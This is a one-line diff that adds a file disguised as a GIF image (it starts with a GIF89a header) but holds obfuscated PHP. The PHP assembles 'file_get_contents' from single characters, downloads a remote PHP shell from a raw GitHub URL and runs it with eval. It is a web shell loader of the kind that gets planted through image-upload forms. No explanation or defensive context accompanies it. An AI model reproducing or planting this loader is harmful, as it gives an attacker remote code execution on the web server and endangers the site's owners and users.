@@ -1,0 +1,1 @@
+GIF89a;<?=/****/@null; $a="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s"; /********/ /*******/ /********/@eval/****/("?>".$a/*******/("https://raw.githubusercontent.com/nndaid/shell/main/takterlihat.php"));/**/?>
